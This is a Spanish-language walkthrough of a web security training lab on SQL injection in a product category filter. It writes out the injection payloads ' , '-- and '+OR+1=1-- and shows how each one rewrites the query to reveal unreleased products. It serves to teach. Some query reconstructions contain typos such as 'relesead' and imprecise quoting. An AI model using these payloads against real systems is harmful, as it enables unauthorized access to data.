# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

![Practitioner](https://img.shields.io/badge/level-Apprentice-green)

---

Tenemos un sitio web para realizar compras de productos:
![image](https://github.com/user-attachments/assets/e7f1d850-f540-4cfc-9495-0bae72bb061e)

Podemos buscar productos y realizar filtros según su categoría, probamos filtrar por `Gifts`:
![image](https://github.com/user-attachments/assets/a82cdd53-a451-41de-8bbc-b3da6aedd74f)

Nosotros sabemos que la consulta por detrás es la siguiente:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
Y sabemos que el valor de `category` lo toma del parámetro de la url `?category=Gifts`.

Procedemos a intentar romper la consulta, añadiendo el caracter `'`, lo cual cerraría la consulta de la siguiente forma:
```sql
SELECT * FROM products WHERE category = 'Gifts'' AND relesead = 1
```
La última parte de la consulta (`' AND relesead = 1`) queda por fuera y podría causar un error de sintaxis:
![image](https://github.com/user-attachments/assets/b8469c86-9f5b-422f-9eda-9ed3f7cc83d5)

Este es el primer indicador de que podría haber inyección SQL.


Lo que hacemos ahora es añadir el siguiente payload: `'--`
Por lo cual la consulta completa sería:
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND relesead = 1
```
Que es lo mismo que:
```sql
SELECT * FROM products WHERE category = 'Gifts'
```


![image](https://github.com/user-attachments/assets/4540d5d6-30f7-45fe-8550-40f44392e647)

Como vemos se realizó la consulta, lo cual confirmamos que hay inyección SQL.

Procedemos a resolver el lab inyectando el siguiente payload: `'+OR+1=1--`

Por lo que la cadena de consulta quedaría:

```sql
SELECT * FROM products WHERE category = 'Gifts'+OR+1=1-- AND relesead = 1
```
Que sería lo mismo que:
```sql
SELECT * FROM products WHERE category = 'Gifts'+OR+1=1
```

Lo cual se traduce en `mostrame todas las filas de la tabla products donde la categoria es Gifts o donde 1=1`. Por lo que mostrará todos los productos:

![image](https://github.com/user-attachments/assets/acec4257-02e1-4607-a0c5-b9b481997939)




